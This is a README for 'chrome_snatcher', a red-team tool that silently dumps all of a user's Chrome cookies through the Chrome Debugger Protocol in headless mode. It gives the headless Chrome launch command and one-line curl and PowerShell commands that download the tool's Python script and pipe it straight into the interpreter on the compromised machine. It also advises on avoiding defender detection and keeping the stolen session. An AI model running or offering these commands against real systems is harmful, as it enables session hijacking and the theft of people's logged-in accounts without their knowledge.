# chrome_snatcher
Chrome (headless) cookie snatcher

For use in Red Team ops where you have a shell on a user's machine and want to (silently) dump their cookies, without needing to compromise their keychain on OSX.  

(Ab)uses Chrome Debugger Protocol (CDP) in headless mode by stealing all of the cookies.  Start chrome in headless mode, start chrome-snatchin', and obtain all the sessions.

***Also, additional caveat:  Chrome Debugger Protocol is verrry cantankerous (read: buggy), so it may not cooperate immediately, but luckily it's not noisy to start and stop it.  Be forewarned: if you run chrome in headless mode and the user tries to OPEN Chrome, it will bug out and not open, which will likely lead them to restart their machine, log out, etc, which may cost you an active session.  Caveat emptor.

No additional privilege needed to run it beyond what the user already has.

Usage:

`/path/to/user's/chrome --headless=new --remote-debugging-port=9222 --remote-allow-origins="*" --restore-session --no-sandbox --disable-gpu --profile-directory="Profile <x>" (In my case it wasn't 0 or 1, so you might have to do some additional recon/trial/error here)`

OSX/Linux:
`curl -s https://raw.githubusercontent.com/pwna5aurus/chrome_snatcher/main/chrome_snatcher.py | python3`

Windows (potentially risky method for deployment as Blue/IR usually watches POSH like a hawk, probably better to use your C2):
`Invoke-WebRequest -Uri "https://raw.githubusercontent.com/pwna5aurus/chrome_snatcher/main/chrome_snatcher.py" -UseBasicParsing | Select-Object -ExpandProperty Content | python -`

Enjoy!
